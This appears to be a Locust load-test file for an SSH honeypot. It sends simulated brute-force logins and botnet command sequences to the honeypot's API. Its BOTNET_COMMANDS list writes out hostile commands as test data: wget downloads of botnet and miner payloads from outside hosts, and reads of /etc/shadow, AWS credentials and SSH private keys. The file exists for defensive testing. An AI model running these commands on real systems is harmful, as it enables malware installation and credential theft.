"""
CloudSentinel Locust Load Test — SSH honeypot stress testing.

Simulates realistic botnet attack patterns: SSH brute force,
command injection, lateral movement. Validates 500+ concurrent
connections at sub-100ms MTTB.

Usage:
    pip install locust
    locust -f locustfile.py --host=ssh://localhost:2222

Requires: locust>=2.32.0
"""

from __future__ import annotations

import random
import time

from locust import HttpUser, between, events, task

# ── Realistic botnet SSH command sequences ──
BOTNET_COMMANDS = [
    # Mirai-style scanner
    ["enable", "system", "shell", "sh", "cat /proc/mounts; /bin/busybox MIRAI"],
    # Gafgyt brute force
    ["uname -a", "cat /etc/passwd", "wget http://185.244.25.187/bins.sh -O /tmp/bins.sh"],
    # Hajime worm
    ["id", "cat /proc/version", "wget http://l.ocalhost.host/.hajime -O /tmp/.hajime"],
    # Crypto miner deployment
    ["uname -m", "free -m", "nproc", "wget http://pool.example/xmrig -O /tmp/xmrig", "chmod +x /tmp/xmrig"],
    # Lateral movement
    ["whoami", "cat /etc/hosts", "ssh root@10.0.0.5 -p 2222"],
    # Credential harvesting
    ["cat /etc/shadow", "cat /root/.aws/credentials", "cat /root/.ssh/id_rsa"],
]

COUNTRIES = ["CN", "RU", "IR", "VN", "BR", "NG", "IN", "PK", "UA", "RO"]
USERNAMES = ["root", "admin", "ubuntu", "debian", "user", "test", "oracle"]
PASSWORDS = [
    "123456", "admin", "password", "root", "1234", "admin123",
    "P@ssw0rd", "qwerty", "letmein", "toor",
]
SSH_CLIENTS = [
    "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6",
    "SSH-2.0-Dropbear_2022.83",
    "SSH-2.0-libssh_0.9.6",
    "SSH-2.0-PuTTY_Release_0.70",
    "SSH-2.0-Go",
]


class SSHUser(HttpUser):
    """Simulates a botnet-infected host attacking the honeypot."""
    wait_time = between(0.5, 3.0)

    def on_start(self):
        self.ip = f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
        self.country = random.choice(COUNTRIES)

    @task(3)
    def ssh_brute_force(self):
        """Simulate SSH brute force attack pattern."""
        self.client.headers.update({
            "X-Forwarded-For": self.ip,
            "X-Country": self.country,
            "X-SSH-Client": random.choice(SSH_CLIENTS),
        })
        username = random.choice(USERNAMES)
        password = random.choice(PASSWORDS)
        # Send auth event
        self.client.post("/api/ssh/auth", json={
            "username": username,
            "password": password,
            "src_ip": self.ip,
        })

    @task(2)
    def execute_commands(self):
        """Execute a botnet command sequence."""
        commands = random.choice(BOTNET_COMMANDS)
        for cmd in commands:
            self.client.post("/api/ssh/command", json={
                "input": cmd,
                "src_ip": self.ip,
                "session": f"locust-{self.ip}-{time.time()}",
            })

    @task(1)
    def port_scan(self):
        """Simulate port scanning reconnaissance."""
        self.client.get("/", headers={"X-Forwarded-For": self.ip})


# ── Custom event hooks ──
@events.init.add_listener
def on_locust_init(environment, **kwargs):
    """Print test configuration."""
    print("[Locust] CloudSentinel SSH Honeypot Load Test")
    print(f"[Locust] Target: {environment.host}")
    print(f"[Locust] Botnet profiles: {len(BOTNET_COMMANDS)}")
    print(f"[Locust] Countries: {len(COUNTRIES)}")
    print(f"[Locust] SSH clients: {len(SSH_CLIENTS)}")


@events.test_start.add_listener
def on_test_start(environment, **kwargs):
    print(f"[Locust] Starting with {environment.runner.target_user_count} users")


@events.test_stop.add_listener
def on_test_stop(environment, **kwargs):
    print("[Locust] Test complete. Check HTML report for MTTB percentiles.")
